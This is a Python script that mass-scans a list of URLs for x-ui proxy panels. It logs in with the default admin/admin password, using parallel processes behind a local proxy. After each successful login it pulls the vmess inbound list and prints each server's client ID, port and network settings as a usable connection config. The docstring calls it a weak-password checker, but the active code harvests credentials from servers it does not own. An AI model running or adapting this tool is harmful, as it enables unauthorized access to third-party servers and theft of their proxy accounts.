# -*- coding = utf-8 -*-
# @File :xui_weak_pass.py
import json
from multiprocessing import Pool

import requests
import urllib3

urllib3.disable_warnings()


class WeakChecker:
    """
    未授权访问检查器
    """

    def __init__(self, url_file: str, result_file: str):
        self._url_file = url_file
        self._result_file = result_file
        self._cache = set()

    def _fetch_url(self, url: str) -> bool:
        """
        检查指定URL是否存在未授权访问情况
        """
        url = url.rstrip('/')
        if url in self._cache:
            return False
        proxies = {
            'http': 'http://127.0.0.1:10809',
            'https': 'https://127.0.0.1:10809'
        }
        check_url = f"{url}/login"
        headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                                 "Chrome/94.0.4606.81 Safari/537.36",
                   "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        # pass_test = ["admin123", "admin", '123456', "123123", "admin888"]
        # for password in pass_test:
        #     # 更新字典中的密码
        data = {"username": "admin", "password": "admin"}
        try:
            res = requests.post(check_url, data=data, proxies=proxies, headers=headers, timeout=10)
            self._cache.add(check_url)
            if res.status_code == 200 and "true" in res.text:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/94.0.4606.81 Safari/537.36",
                    'Cookie': res.headers.get('Set-Cookie'),
                    "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
                check_url = f"{url}/xui/inbound/list"
                response = requests.post(check_url, proxies=proxies, headers=headers, timeout=10)
                response_data = response.json()
                obj_content = response_data["obj"]
                for item in obj_content:
                    # 检查'protocol'键的值是否为'vmess'
                    if item.get("protocol") == "vmess":
                        # 获取需要的字段值，如果字段不存在则返回"none"
                        port_value = item.get("port", "none")
                        settings = json.loads(item["settings"])
                        streamSettings = json.loads(item["streamSettings"])
                        id_value = settings["clients"][0]["id"]
                        url_without_protocol = url.split("://")[-1]
                        # 然后去除端口号部分
                        ip_address = url_without_protocol.split(":")[0]
                        add_value = ip_address
                        aid_value = item.get("aid", "0")
                        network_value = streamSettings["network"]
                        result = {
                            "v": 2,
                            "add": add_value,
                            "port": port_value,
                            "id": id_value,
                            "aid": aid_value,
                            "network": network_value
                        }
                        print(result)

                # print(res_rule.text)
                # with open(self._result_file, "a", encoding="utf-8") as f:
                #     f.write(f"{url}\n")
                #     print(f"{url} 该链接存在弱口令访问情况,请及时修复！")
                #     f.close()
            else:
                print(f"{url} + ' ' + '该链接不可用'" + res.text)
        except Exception as e:
            print(e)

    def check(self):
        """
        对URL文件中的所有链接逐一进行检查
        """
        with open(self._url_file, "r", encoding="utf-8") as file:
            urls = [url.strip() for url in file]
        with Pool(processes=10) as p:
            p.map(self._fetch_url, urls)


if __name__ == "__main__":
    checker = WeakChecker("url.txt", "result.txt")
    checker.check()
